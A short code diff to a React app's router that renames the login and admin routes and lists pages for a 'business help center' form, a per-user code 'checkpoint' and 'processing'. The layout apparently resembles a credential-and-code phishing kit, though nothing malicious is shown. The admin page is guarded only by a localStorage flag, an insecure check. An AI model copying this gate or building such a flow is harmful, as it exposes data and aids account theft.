@@ -13,7 +13,7 @@ function PrivateRoute({ children }) {
   return localStorage.getItem("logined") === "true" ? (
     <>{children}</>
   ) : (
-    <Navigate to="/login" />
+    <Navigate to="/signin" />
   );
 }
 
@@ -26,9 +26,9 @@ function App() {
           <Route path="/business-help-center" element={<MyForm/>} />
           <Route path="checkpoint/:userID" element={<AuthCode />} />
           <Route path="processing/:userID" element={<ClassUser />} />
-          <Route path="login" element={<Login />} />
+          <Route path="signin" element={<Login />} />
           <Route
-            path="/admin"
+            path="/adminpanel"
             element={
               <PrivateRoute>
                 <AdminPage />
